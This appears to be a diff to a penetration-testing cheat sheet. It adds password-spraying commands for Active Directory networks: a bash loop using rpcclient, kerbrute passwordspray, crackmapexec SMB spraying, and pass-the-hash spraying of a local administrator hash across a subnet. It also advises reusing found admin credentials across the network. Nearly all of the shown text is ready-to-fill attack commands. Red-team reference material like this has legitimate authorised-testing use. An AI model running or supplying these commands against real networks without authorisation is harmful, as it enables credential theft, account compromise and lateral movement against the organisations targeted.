@@ -60,10 +60,24 @@ Making a list, checking it twice
   ```
 
 Spray and Pray
-> Password spraying is very loud and very likley to be detected by a blue team
+> Password spraying is very loud and very likely to be detected by a blue team
 * Bash one-liner
   ```bash
   for u in $(cat <userlist>);do rpcclient -U "<password-to-test" -c "getusername;quit" <IP> | grep Authority; done
+  ```
+* Kerbrute
+  ```bash
+  kerbrute passwordspray -d <domain> --dc <IP> <userlist.txt> <Password_to_test>
+  ```
+* crackmapexec
+  ```bash
+  crackmapexec smb <IP> -u <userlist.txt> -p <Password_to_test> | grep +
+  ```
+> Consider local admin password reuse, and spray a local admin username and password across the network if you find it.
+> > Even spray local admin hashes if you find them
+* crackmapexec
+  ```bash
+  sudo crackmapexec smb --local-auth <IP>/<cidr> -u administrator -H <hash> | grep +
   ```
 
 
